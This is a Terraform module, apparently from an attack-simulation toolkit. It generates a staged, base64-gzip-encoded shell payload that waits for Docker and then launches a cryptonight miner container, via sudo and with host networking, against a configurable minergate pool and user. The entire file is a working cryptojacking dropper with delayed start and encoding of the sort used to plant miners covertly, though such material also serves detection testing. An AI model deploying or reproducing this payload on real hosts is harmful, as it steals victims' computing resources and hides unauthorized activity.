locals {
    # nicehash_name = var.inputs["nicehash_name"]
    # nicehash_image = var.inputs["nicehash_image"]
    # nicehash_server = var.inputs["nicehash_server"]
    # nicehash_user = var.inputs["nicehash_user"]
    minergate_name = var.inputs["minergate_name"]
    minergate_image = var.inputs["minergate_image"]
    minergate_server = var.inputs["minergate_server"]
    minergate_user=var.inputs["minergate_user"]

    payload = <<-EOT
    LOGFILE=/tmp/${var.inputs["tag"]}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    MAXLOG=2
    for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
    mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
    check_package_manager() {
        pgrep -f "apt" || pgrep -f "dpkg" || pgrep -f "yum" || pgrep -f "rpm"
    }
    while check_package_manager; do
        log "Waiting for package manager to be available..."
        sleep 10
    done
    log "Checking for docker..."
    while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
        log "docker not found or not ready - waiting"
        sleep 120
    done
    log "docker path: $(command -v  docker)"
    if [[ `sudo docker ps | grep ${local.minergate_name}` ]]; then docker stop ${local.minergate_name}; fi
    sudo docker run --rm -d --network=host --name ${local.minergate_name} ${local.minergate_image} -a cryptonight -o ${local.minergate_server} -u ${ local.minergate_user } -p x
    sudo docker ps -a >> $LOGFILE 2>&1
    log "done"
    EOT
    
    base64_payload = base64gzip(templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
        script_name = basename(path.module)
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = ""
        apt_post_tasks = ""
        yum_pre_tasks =  ""
        yum_packages = ""
        yum_post_tasks = ""
        script_delay_secs = 30
        next_stage_payload = local.payload
    }}))

    outputs = {
        base64_payload = local.base64_payload
    }
}